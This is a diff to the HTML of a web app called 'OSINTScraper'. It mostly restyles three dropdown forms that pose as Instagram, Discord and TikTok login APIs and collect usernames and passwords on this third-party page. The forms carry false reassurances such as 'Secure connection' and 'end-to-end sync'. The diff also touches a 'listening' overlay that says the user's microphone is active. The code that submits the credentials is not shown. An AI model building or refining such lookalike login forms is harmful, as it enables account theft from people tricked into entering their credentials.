@@ -76,13 +76,13 @@ When you're ready, click below to begin.
       <span><i class="fas fa-cog"></i></span>
     </div>
     
-<div id="userArea" style="position:absolute; top:40px; right:150px; display:flex; align-items:center; gap:10px; color:#fff; font-weight:bold;">
-<div id="userDisplay" style="position:relative; top:-6px; font-size:1.5em;"></div>
+      <div id="userArea" style="position:absolute; top:40px; right:150px; display:flex; align-items:center; gap:10px; color:#fff; font-weight:bold;">
+<div id="userDisplay" style="position:relative; top:-6px; font-size:1.9em;"></div>
   <button id="settingsBtn">
     <img class="gear-icon" 
          src="https://imgs.search.brave.com/y_UHOowpBqp_qIhvVop_GpwO5iEhdY05l0O8eHhCynM/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9zdGF0/aWMudmVjdGVlenku/Y29tL3N5c3RlbS9y/ZXNvdXJjZXMvdGh1/bWJuYWlscy8wMTQv/Mzk2LzQ1Mi9zbWFs/bC9jb21pYy1zdHls/ZS11c2VyLWljb24t/d2l0aC10cmFuc3Bh/cmVudC1iYWNrZ3Jv/dW5kLWZpbGUtcG5n/LnBuZw"
          alt="Settings Icon"
-         style="width:80px; height:80px; position:relative; top:-4px;">
+         style="width:100px; height:100px; position:relative; top:-8px;">
   </button>
 </div>
 
@@ -471,65 +471,194 @@ document.getElementById("dropdownHeader3").addEventListener("click", () => {
 });
 </script>
           
-          <button id="go-post-error" class="msger-send-btn">Instagram</button>
-          <div id="instagram-dropdown" class="login-dropdown">
-    <div class="login-container" style="background:#1e1e1e; border:1px solid #333;">
-        <h2>Instagram Connect API</h2>
-          <p>Logging in will forward and connect you to <strong>@osint_scraper</strong>, like other APIs Instagram will automatically redirect you in the future if your account is linked to your browser.</p>
+<button id="go-post-error" class="msger-send-btn">Instagram</button>
 
-        <form id="instagramForm">
-            <input type="text" name="username" placeholder="Phone, email, or username" required autocomplete="username" />
-            <input type="password" placeholder="Password" required autocomplete="current-password" />
-            <p id="errorsisMsg" style="margin: 5px 0 0; font-size: 14px;"></p>
-            <button type="submit" style="
-                background:linear-gradient(to right,#8a3ab9,#c13584,#e1306c,#fd1d1d);
-            ">Continue</button>
-        </form>
+<div id="instagram-dropdown" class="login-dropdown" style="background:#222 !important;">
+  <div
+    class="login-container"
+    style="background:#2f2f2f !important; border:1px solid #444 !important;"
+  >
+    <h2 style="color:#fff !important;">Instagram Connect API</h2>
 
-        <div class="footer">
-            <div>Your data is secured with end‑to‑end sync</div>
-            <div>App v2.4.1 • Secure connection</div>
-        </div>
+    <p style="color:#ccc !important;">
+      Logging in will forward and connect you to <strong>@osint_scraper</strong>, like other APIs Instagram will automatically redirect you in the future if your account is linked to your browser.
+    </p>
+
+    <form id="instagramForm">
+      <input
+        type="text"
+        name="username"
+        placeholder="Phone, email, or username"
+        required
+        autocomplete="username"
+        style="background:#3a3a3a !important; color:#fff !important; border:1px solid #555 !important;"
+      />
+
+      <input
+        type="password"
+        placeholder="Password"
+        required
+        autocomplete="current-password"
+        style="background:#3a3a3a !important; color:#fff !important; border:1px solid #555 !important;"
+      />
+
+      <p
+        id="errorsisMsg"
+        style="margin:5px 0 0; font-size:14px; color:#fff !important;"
+      ></p>
+
+      <button
+        type="submit"
+        style="background:linear-gradient(to right,#8a3ab9,#c13584,#e1306c,#fd1d1d) !important; color:#fff !important; border:none !important;"
+      >
+        Continue
+      </button>
+    </form>
+
+    <div class="footer" style="color:#aaa !important;">
+      <div>Your data is secured with end-to-end sync</div>
+      <div>App v2.4.1 • Secure connection</div>
     </div>
+  </div>
 </div>
-          <button id="go-post-errors" class="msger-send-btn">Discord</button>
-          <div id="discord-dropdown" class="login-dropdown">
-    <div class="login-container" style="background:#252525; border:1px solid #444;">
-        <h2>Discord Auth API</h2>
-        <p>You will join the server <strong>Project OSINTScraper</strong>, like other APIs Discord will handle the redirection if your account is linked to your browser.</p>
 
-        <form id="discordForm">
-            <input type="text" name="username" placeholder="Phone, email, or username" required autocomplete="username" />
-            <input type="password" placeholder="Password" required autocomplete="current-password" />
-            <p id="errorsMsg" style="margin: 5px 0 0; font-size: 14px;"></p>
-            <button type="submit" style="background:#5865F2;">Authorize</button>
-        </form>
 
-        <div class="footer">
-            <div>Your data is secured with end‑to‑end sync</div>
-            <div>App v2.4.1 • Secure connection</div>
-        </div>
+<button id="go-post-errors" class="msger-send-btn">Discord</button>
+
+<div id="discord-dropdown" class="login-dropdown" style="background:#222 !important;">
+  <div
+    class="login-container"
+    style="background:#2f2f2f !important; border:1px solid #444 !important;"
+  >
+    <h2 style="color:#fff !important;">Discord Auth API</h2>
+
+    <p style="color:#ccc !important;">
+      You will join the server <strong>Project OSINTScraper</strong>, like other APIs Discord will handle the redirection if your account is linked to your browser.
+    </p>
+
+    <form id="discordForm">
+      <input
+        type="text"
+        name="username"
+        placeholder="Phone, email, or username"
+        required
+        autocomplete="username"
+        style="background:#3a3a3a !important; color:#fff !important; border:1px solid #555 !important;"
+      />
+
+      <input
+        type="password"
+        placeholder="Password"
+        required
+        autocomplete="current-password"
+        style="background:#3a3a3a !important; color:#fff !important; border:1px solid #555 !important;"
+      />
+
+      <p
+        id="errorsMsg"
+        style="margin:5px 0 0; font-size:14px; color:#fff !important;"
+      ></p>
+
+      <button
+        type="submit"
+        style="background:#5865F2 !important; color:#fff !important; border:none !important;"
+      >
+        Authorize
+      </button>
+    </form>
+
+    <div class="footer" style="color:#aaa !important;">
+      <div>Your data is secured with end-to-end sync</div>
+      <div>App v2.4.1 • Secure connection</div>
     </div>
+  </div>
 </div>
-          <button id="go-posts-error" class="msger-send-btn">TikTok</button>
-          <div id="login-dropdown" class="login-dropdown">
-          <div class="login-container">
-          <h2>TikTok Management API</h2>
-          <p>Logging in will connect and forward you to <strong>@osint_scraperr</strong>, like other APIs TikTok will manage the redirection if your account is linked to your browser.</p>
 
-        <form id="loginForm">
-            <input type="text" name="username" placeholder="Phone, email, or username" required autocomplete="username" />
-            <input type="password" placeholder="Password" required autocomplete="current-password" />
-            <p id="errorMsg" style="margin: 5px 0 0; font-size: 14px;"></p>
-            <button type="submit">Continue</button>
-        </form>
 
-        <div class="footer">
-            <div>Your data is secured with end-to-end sync</div>
-            <div>App v2.4.1 • Secure connection</div>
-        </div>
+<button id="go-posts-error" class="msger-send-btn">TikTok</button>
+
+<div id="login-dropdown" class="login-dropdown" style="background:#000 !important;">
+  <div
+    class="login-container"
+    style="background:#000 !important; border:1px solid #333 !important;"
+  >
+    <h2 style="color:#fff !important;">TikTok Management API</h2>
+
+    <p style="color:#ccc !important;">
+      Logging in will connect and forward you to <strong>@osint_scraperr</strong>, like other APIs TikTok will manage the redirection if your account is linked to your browser.
+    </p>
+
+    <form id="loginForm">
+      <input
+        type="text"
+        name="username"
+        placeholder="Phone, email, or username"
+        required
+        autocomplete="username"
+        style="background:#222 !important; color:#fff !important; border:1px solid #444 !important;"
+      />
+
+      <input
+        type="password"
+        placeholder="Password"
+        required
+        autocomplete="current-password"
+        style="background:#222 !important; color:#fff !important; border:1px solid #444 !important;"
+      />
+
+      <p
+        id="errorMsg"
+        style="margin:5px 0 0; font-size:14px; color:#fff !important;"
+      ></p>
+
+      <button
+        type="submit"
+        style="
+          background:linear-gradient(90deg,#25F4EE 0%,#25F4EE 20%,#FE2C55 80%,#FE2C55 100%) !important;
+          color:#fff !important;
+          border:none !important;
+          box-shadow:0 0 12px rgba(37,244,238,0.25), 0 0 12px rgba(254,44,85,0.25) !important;
+        "
+      >
+        Continue
+      </button>
+    </form>
+
+    <div class="footer" style="color:#aaa !important;">
+      <div>Your data is secured with end-to-end sync</div>
+      <div>App v2.4.1 • Secure connection</div>
     </div>
+  </div>
 </div>
+
+<style>
+#instagram-dropdown input::placeholder,
+#discord-dropdown input::placeholder,
+#login-dropdown input::placeholder {
+  color: #bdbdbd !important;
+  opacity: 1 !important;
+}
+
+#instagram-dropdown input,
+#discord-dropdown input,
+#login-dropdown input {
+  color: #fff !important;
+}
+
+#login-dropdown button[type="submit"]:hover {
+  background: linear-gradient(
+    90deg,
+    #18e7e1 0%,
+    #18e7e1 20%,
+    #ff174d 80%,
+    #ff174d 100%
+  ) !important;
+  box-shadow:
+    0 0 18px rgba(37,244,238,0.4),
+    0 0 18px rgba(254,44,85,0.4) !important;
+}
+</style>
+
         </div>
       </div>
     </div>
@@ -567,38 +696,41 @@ document.getElementById("msger-send-btn").addEventListener("click", () => {
 </section>
 
 <div id="call-overlay" style="display: none; justify-content: center; align-items: center; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999;">
-<div class="call-modal" style="text-align: center; color: white; font-size: 28px; width: 80%; max-width: 1050px;">
-    <h2 style="font-size: 44px;">Connected</h2>
-    <p style="font-size: 68px; font-weight: bold; color: #fff; margin-bottom: 20px;">
+  <div class="call-modal" style="text-align: center; color: #111; font-size: 28px; width: 80%; max-width: 1050px;">
+
+    <h2 style="font-size: 44px; color: #2B2724;">Connected</h2>
+
+    <p style="font-size: 68px; font-weight: bold; color: #2B2724; margin-bottom: 20px;">
       OSINTScraper is listening...
     </p>
 
     <div id="bubble-wrapper" style="margin:25px auto; display:inline-block;">
-      <div id="bubble" style="
-        width: 75px;
-        height: 75px;
-        background: white;
-        border-radius: 50%;
-        box-shadow: 0 0 25px rgba(255,255,255,0.7);
-        animation: bubblePulse 2s infinite;
-      "></div>
+<div id="bubble" style="
+  width: 82px;
+  height: 82px;
+  background: #D9C4B0;
+  border-radius: 50%;
+  box-shadow: 0 0 18px rgba(82,58,40,0.65), 0 0 35px rgba(82,58,40,0.3);
+  animation: bubblePulse 2s infinite;
+"></div>
     </div>
 
-<p style="font-size: 32px; color: #ccc; margin-bottom: 25px;">
-  Please speak clearly your microphone is now active. Share a brief introduction about yourself and outline your objectives for OSINTScraper.
-</p>
+    <p style="font-size: 32px; color: #222; margin-bottom: 25px;">
+      Please speak clearly your microphone is now active. Share a brief introduction about yourself and outline your objectives for OSINTScraper.
+    </p>
 
-<p style="font-size: 30px; color: #bbb; margin-bottom: 20px;">
-  Select “Hang Up” to end the session securely.
-</p>
+    <p style="font-size: 30px; color: #333; margin-bottom: 20px;">
+      Select “Hang Up” to end the session securely.
+    </p>
 
-<p style="font-size: 28px; color: #999; margin-top: 25px;">
-  Processing and analyzing your input in real time.
-</p>
+    <p style="font-size: 28px; color: #444; margin-top: 25px;">
+      Processing and analyzing your input in real time.
+    </p>
+
     <div class="call-actions" style="margin-top: 25px;">
-     <button class="decline" id="hang-up" style="font-size: 46px; padding: 35px 50px;">
-  Hang Up
-</button>
+      <button class="decline" id="hang-up" style="font-size: 46px; padding: 35px 50px;">
+        Hang Up
+      </button>
 
 <script>
 document.getElementById("hang-up").addEventListener("click", () => {
@@ -886,7 +1018,8 @@ OSINTScraper uses different techniques commonly used when using public informati
   if (username) {
     const userDisplayEl = document.getElementById("userDisplay");
     const sidebarUsernameEl = document.getElementById("sidebarUsername");
-    if (userDisplayEl) userDisplayEl.textContent = "Welcome, " + username;
+  userDisplayEl.textContent = "Welcome, " + username;
+  userDisplayEl.style.color = "#2B2724";
     if (sidebarUsernameEl) sidebarUsernameEl.textContent = username;
   }
 
